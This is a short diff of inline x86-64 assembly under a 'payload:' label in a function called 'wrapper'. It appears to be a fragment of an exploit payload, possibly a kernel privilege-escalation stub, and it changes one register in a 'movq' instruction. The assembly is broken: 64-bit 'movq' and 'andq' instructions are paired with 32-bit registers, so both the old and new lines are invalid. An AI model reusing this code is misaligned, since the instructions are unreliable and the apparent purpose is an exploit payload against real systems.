@@ -177,7 +177,7 @@ uint64_t saved_esp;
 void wrapper() {
 	asm volatile ("					\n\
 	payload:					\n\
-		movq %%ebp, %%rax			\n\
+		movq %%ebp, %%eax			\n\
 		movq $0xffffffff00000000, %%rdx		\n\
 		andq %%edx, %%eax			\n\
 		movq %0, %%edx				\n\
